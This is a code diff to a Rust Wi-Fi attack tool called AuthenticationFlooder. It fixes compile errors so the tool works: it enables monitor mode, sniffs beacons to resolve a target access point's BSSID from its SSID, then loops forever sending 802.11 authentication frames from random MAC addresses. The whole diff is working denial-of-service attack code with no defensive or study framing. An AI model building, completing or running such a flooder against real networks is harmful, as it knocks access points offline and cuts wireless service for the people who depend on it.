@@ -27,13 +27,13 @@ impl AuthenticationFlooder {
 
 
 
-    pub fn execute() {
+    pub fn execute(&mut self) {
         InterfaceManager::enable_monitor_mode(&self.iface);
         
-        let bssid = self.args.bssid.unwrap_or_else(self.resolve_bssid());
+        let bssid = self.args.bssid.unwrap_or_else(|| self.resolve_bssid());
         self.send_endlessly(bssid);
         
-        InterfaceManager::disable_monitor_mode(&iface);
+        InterfaceManager::disable_monitor_mode(&self.iface);
     }
 
 
@@ -46,7 +46,7 @@ impl AuthenticationFlooder {
 
 
     fn get_beacons(&mut self) -> Vec<Vec<u8>> {
-        InterfaceManager::enable_monitor_mode(&iface);
+        InterfaceManager::enable_monitor_mode(&self.iface);
         
         let mut sniffer = PacketSniffer::new(
             self.iface.clone(), "type mgt and subtype beacon".to_string()
@@ -63,22 +63,23 @@ impl AuthenticationFlooder {
 
     fn process_beacons(&self, beacons: Vec<Vec<u8>>) -> [u8; 6] {
         for b in beacons {
-            let into = BeaconDissector::parse_beacon(b);
-            if info[0] == self.args.ssid {
-                return parse_mac(info[1]);
+            if let Some(info) = BeaconDissector::parse_beacon(&b) {
+                if info[0] == self.args.ssid {
+                    return parse_mac(&info[1]).unwrap();
+                }
             }
         }
         
-        InterfaceManager::disable_monitor_mode(&iface);
+        InterfaceManager::disable_monitor_mode(&self.iface);
         abort("It was not possible to resolve BSSID. Try again or set a BSSID")
     }
 
 
 
     fn send_endlessly(&self, bssid: [u8; 6]) {
-        let rand    = RandValues::new();
-        let builder = PacketBuilder::new();
-        let socket  = Layer2RawSocket::new(&self.iface); 
+        let mut rand    = RandValues::new();
+        let mut builder = PacketBuilder::new();
+        let socket      = Layer2RawSocket::new(&self.iface); 
 
         loop {
             let pkt = builder.auth_802_11(rand.get_random_mac(), bssid);
